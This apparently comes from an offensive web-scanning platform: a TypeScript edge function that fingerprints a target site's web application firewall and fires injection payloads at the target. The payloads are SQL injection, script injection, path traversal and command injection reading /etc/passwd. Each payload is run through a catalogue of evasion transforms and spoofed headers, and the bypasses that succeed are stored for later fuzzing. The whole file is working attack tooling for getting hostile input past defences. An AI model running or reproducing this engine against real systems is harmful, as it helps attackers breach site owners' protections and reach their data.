// WAF Evasion Engine
// Fingerprints the target's WAF, probes a battery of bypass techniques,
// records which ones pass / get blocked, and writes a reusable profile
// to public.waf_profiles for downstream fuzzers to pick up.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { safeFetch } from "../_shared/safe-fetch.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

function db() {
  return createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
}

// ── WAF fingerprint heuristics ────────────────────────────────────────────
function fingerprintWaf(headers: Headers, body: string, status: number): string {
  const h = Object.fromEntries(headers.entries());
  const blob = (JSON.stringify(h) + " " + body).toLowerCase();
  if (h["cf-ray"] || /cloudflare/.test(blob)) return "cloudflare";
  if (/akamai|akamaighost/.test(blob)) return "akamai";
  if (/aws.{0,5}waf|awselb/.test(blob) || h["x-amzn-requestid"]) return "aws_waf";
  if (/incapsula|imperva/.test(blob)) return "imperva";
  if (/sucuri/.test(blob)) return "sucuri";
  if (/f5|big-ip|bigip/.test(blob)) return "f5_bigip";
  if (/barracuda/.test(blob)) return "barracuda";
  if (/fortinet|fortiweb/.test(blob)) return "fortinet";
  if (/modsecurity|mod_security/.test(blob)) return "modsecurity";
  if (status === 406 || status === 419 || status === 429) return "generic_blocking";
  return "generic";
}

// ── Bypass technique catalog ──────────────────────────────────────────────
// Each technique takes a baseline malicious payload and produces a variant.
type Technique = { name: string; transform: (p: string) => string; headers?: Record<string, string> };

const TECHNIQUES: Technique[] = [
  { name: "baseline", transform: (p) => p },
  { name: "url_double_encode", transform: (p) => encodeURIComponent(encodeURIComponent(p)) },
  { name: "url_single_encode", transform: (p) => encodeURIComponent(p) },
  { name: "mixed_case", transform: (p) => p.split("").map((c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase())).join("") },
  { name: "comment_break", transform: (p) => p.replace(/select/gi, "sel/**/ect").replace(/union/gi, "un/**/ion") },
  { name: "tab_sep", transform: (p) => p.replace(/ /g, "\t") },
  { name: "newline_sep", transform: (p) => p.replace(/ /g, "%0a") },
  { name: "unicode_quote", transform: (p) => p.replace(/'/g, "\u2018").replace(/"/g, "\u201c") },
  { name: "null_byte", transform: (p) => p + "%00" },
  { name: "x_original_url", transform: (p) => p, headers: { "X-Original-URL": "/admin" } },
  { name: "x_forwarded_host", transform: (p) => p, headers: { "X-Forwarded-Host": "127.0.0.1" } },
  { name: "x_forwarded_for_localhost", transform: (p) => p, headers: { "X-Forwarded-For": "127.0.0.1" } },
  { name: "host_header_override", transform: (p) => p, headers: { "X-Real-IP": "127.0.0.1" } },
  { name: "content_type_swap_json", transform: (p) => p, headers: { "Content-Type": "application/json; charset=utf-8" } },
  { name: "ua_googlebot", transform: (p) => p, headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" } },
  { name: "ua_curl", transform: (p) => p, headers: { "User-Agent": "curl/7.79.1" } },
  { name: "param_pollution", transform: (p) => `${p}&x=${p}` },
  { name: "trailing_dot", transform: (p) => p + "." },
  { name: "fragment_smuggle", transform: (p) => p.replace("=", "=#%23") },
];

const PROBE_PAYLOADS = [
  { kind: "sqli", payload: "' OR 1=1-- -" },
  { kind: "xss", payload: "<script>alert(1)</script>" },
  { kind: "lfi", payload: "../../../../etc/passwd" },
  { kind: "cmdi", payload: "; cat /etc/passwd" },
];

async function fetchBaseline(url: string) {
  try {
    const r = await safeFetch(url, { method: "GET" }, 6000);
    const body = await r.text().catch(() => "");
    return { status: r.status, len: body.length, headers: r.headers, body };
  } catch (e) {
    return { status: 0, len: 0, headers: new Headers(), body: "", err: String(e) };
  }
}

function isBlocked(status: number, body: string): boolean {
  if ([403, 406, 419, 429, 503].includes(status)) return true;
  const b = body.toLowerCase();
  return /access denied|request blocked|forbidden|firewall|attention required|mod_security|the requested url was rejected/i.test(b);
}

async function runEvasion(targetUrl: string) {
  const base = await fetchBaseline(targetUrl);
  const wafType = fingerprintWaf(base.headers, base.body, base.status);
  const baselineLen = base.len;

  const blocked: any[] = [];
  const working: any[] = [];
  const tested: any[] = [];

  for (const probe of PROBE_PAYLOADS) {
    for (const tech of TECHNIQUES) {
      const variant = tech.transform(probe.payload);
      const sep = targetUrl.includes("?") ? "&" : "?";
      const url = `${targetUrl}${sep}q=${variant}`;
      try {
        const r = await safeFetch(url, {
          method: "GET",
          headers: { "User-Agent": "Mozilla/5.0 CyberScope/WAF-Evasion", ...(tech.headers || {}) },
        }, 6000);
        const body = await r.text().catch(() => "");
        const blockedFlag = isBlocked(r.status, body);
        const rec = { technique: tech.name, kind: probe.kind, status: r.status, len: body.length, blocked: blockedFlag };
        tested.push(rec);
        if (blockedFlag) blocked.push(rec);
        else if (Math.abs(body.length - baselineLen) > 50 || r.status !== base.status) working.push(rec);
      } catch (e) {
        tested.push({ technique: tech.name, kind: probe.kind, error: String(e).slice(0, 80) });
      }
      // gentle throttle
      await new Promise((res) => setTimeout(res, 60));
    }
  }

  return { wafType, baselineStatus: base.status, baselineLen, tested, blocked, working };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  try {
    const body = await req.json().catch(() => ({}));
    const { targetId } = body || {};
    if (!targetId) {
      return new Response(JSON.stringify({ ok: false, error: "targetId required" }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }
    const supa = db();
    const { data: tgt } = await supa.from("target_workspaces")
      .select("id, domain, resolved_protocol").eq("id", targetId).maybeSingle();
    if (!tgt?.domain) {
      return new Response(JSON.stringify({ ok: false, error: "target not found / no domain" }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }
    const url = `${tgt.resolved_protocol || "https"}://${tgt.domain}/`;

    await supa.from("scan_logs").insert({
      target_id: targetId, log_type: "info",
      message: `🛡️ WAF evasion engine starting against ${url}`,
      metadata: { kind: "waf_evasion_start" },
    });

    const result = await runEvasion(url);

    await supa.from("waf_profiles").upsert({
      target_id: targetId,
      waf_type: result.wafType,
      fingerprint: { baselineStatus: result.baselineStatus, baselineLen: result.baselineLen, testedCount: result.tested.length },
      blocked_techniques: result.blocked,
      working_techniques: result.working,
      last_updated: new Date().toISOString(),
    }, { onConflict: "target_id" });

    // Mirror onto target_workspaces.waf_profile so existing fuzzers can pick it up.
    await supa.from("target_workspaces").update({
      waf_profile: {
        waf_type: result.wafType,
        working_techniques: result.working.map((w: any) => w.technique),
        blocked_techniques: result.blocked.map((b: any) => b.technique),
        updated_at: new Date().toISOString(),
      },
    }).eq("id", targetId);

    await supa.from("scan_logs").insert({
      target_id: targetId, log_type: "info",
      message: `🛡️ WAF: ${result.wafType} | bypasses=${result.working.length} blocked=${result.blocked.length}`,
      metadata: { kind: "waf_evasion_done", waf_type: result.wafType, bypasses: result.working.length, blocked: result.blocked.length },
    });

    return new Response(JSON.stringify({ ok: true, wafType: result.wafType, working: result.working.length, blocked: result.blocked.length }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } });
  } catch (e) {
    return new Response(JSON.stringify({ ok: false, error: e instanceof Error ? e.message : String(e) }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});
